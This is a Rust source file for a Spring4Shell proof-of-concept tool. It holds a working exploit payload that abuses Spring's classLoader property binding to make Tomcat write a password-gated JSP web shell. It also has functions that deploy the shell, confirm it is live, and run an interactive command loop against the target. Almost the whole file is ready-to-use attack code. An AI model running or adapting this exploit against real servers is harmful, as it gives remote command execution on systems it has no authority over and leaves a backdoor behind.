// Copyright (c) 2022 Petruknisme
// 
// This software is released under the MIT License.
// https://opensource.org/licenses/MIT

extern crate clap;
extern crate colored;

use clap::Parser;
use colored::Colorize;
use url::Url;
use reqwest;
use snailquote::unescape;
use std::io::Write;


#[derive(Parser)]
#[clap(name = "Spring4shell PoC")]
#[clap(author = "Petruknisme <me@petruknisme.com>")]
#[clap(version = "1.0")]
#[clap(about = "Spring 4 Shell Proof of Concept Script", long_about = None)]


struct Cli {
    /// Spring target url
    #[clap(short, long)]
    url: String,

    /// This mode for sending the payload
    #[clap(short, long)]
    deploy: bool,

    /// This mode for accessing payload with interactive shell
    #[clap(short, long)]
    shell: bool,
    
    /// Input command to run in exploit
    #[clap(short, long)]
    cmd: Option<String>,

}

#[tokio::main]
async fn deploy_payload(url: &str, data: &'static str){
    let client = reqwest::Client::new();
    let _response = client
            .post(url)
            .header("suffix", "%>//")
            .header("c1", "Runtime")
            .header("c2", "<%")
            .header("DNT", "1")
            .header("Content-Type", "application/x-www-form-urlencoded")
            .body(data)
            .send()
            .await;
}

#[tokio::main]
async fn check_shell_exist(url: &str) -> bool{
    let response = reqwest::
                    get(url).await.unwrap();

    if response.status().as_str() == "200" {
        return true;
    }else{
        return false;
    }
}

fn prompt(name:&str) -> String {
    let mut line = String::new();
    print!("{}", name);
    std::io::stdout().flush().unwrap();
    std::io::stdin().read_line(&mut line).expect("Error: Could not read a line");
 
    return line.trim().to_string()
}

#[tokio::main]
async fn get_data_from_url(url: &str) -> String{
    let response = reqwest::get(url).await.unwrap();
    let res = response.text().await.unwrap();
    return res;
}

fn main() {
    let cli = Cli::parse();
    let url = cli.url;
    let deploy = cli.deploy;
    let shell = cli.shell;
    let data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/spring_app&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=";
    
    println!("{}", "\t\tSpring4shell PoC\nSpring 4 Shell Proof of Concept Script written in Rust\n".yellow());
    println!("{} {}",
            "[*] Target:  ".blue(),
            url.red() 
    );

    if deploy {
        println!("{}", "[*] Deploying payload to the target...".blue());
        deploy_payload(&url, &data);
        let mut url_parse = Url::parse(&url).unwrap();
        url_parse
            .path_segments_mut()
            .map_err(|_| "cannot be base")
            .unwrap()
            .pop();
        let shell_url = format!("{}/tomcatwar.jsp", url_parse);
        if check_shell_exist(&shell_url){
            println!("{} {} ", "[*] Payload deployed to".green(), shell_url.green());
            println!("{}", "\nRun your exploit command using: \nspring4shell_poc_rs -u http://example.com:port/file.jsp -s".yellow())
        }else{
            println!("{} {} {}", "[*] Failed to deploy payload ".blue(), shell_url.blue(), " please visit url manually");
        }
    }else if shell {
        println!("{}", "Please input the command to run");
        loop {
            let input=prompt("> ");
            if input=="exit" { 
                break; 
            };
            let exploit_url = format!("{}?pwd=j&cmd={}", &url, input);
            let resp = get_data_from_url(&exploit_url);
            let rs: Vec<String> = resp.split("\n\u{0}").map(|s| s.to_string()).collect();
            println!("{}", unescape(&rs[0]).unwrap());
            
        }
        
    }
}